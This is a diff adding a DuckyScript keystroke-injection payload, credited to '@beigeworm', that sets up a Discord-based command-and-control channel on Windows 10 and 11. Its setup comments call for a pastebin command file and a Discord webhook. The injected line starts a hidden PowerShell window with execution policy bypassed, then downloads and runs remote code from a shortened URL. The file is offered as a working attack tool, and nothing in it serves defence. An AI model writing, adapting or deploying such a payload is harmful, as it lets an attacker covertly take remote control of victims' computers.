@@ -1,0 +1,24 @@
+
+REM Title: beigeworm's Discord Command And Control.
+REM Author: @beigeworm
+REM Description: Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
+REM Target: Windows 10 and 11
+
+REM SETUP
+REM Goto https://pastebin.com and make an account..
+REM Create an empty paste/file and copy the RAW url.
+REM Change PASTEBIN_URL_HERE to the RAW url  eg. https://pastebin.com/raw/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
+REM Change WEBHOOK_HERE to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+
+REM for more info goto - https://github.com/beigeworm/PoshCord-C2
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $hookurl = 'WEBHOOK_HERE'; $ghurl = 'PASTEBIN_URL_HERE'; irm https://is.gd/b1oC6B | iex
+ENTER
+
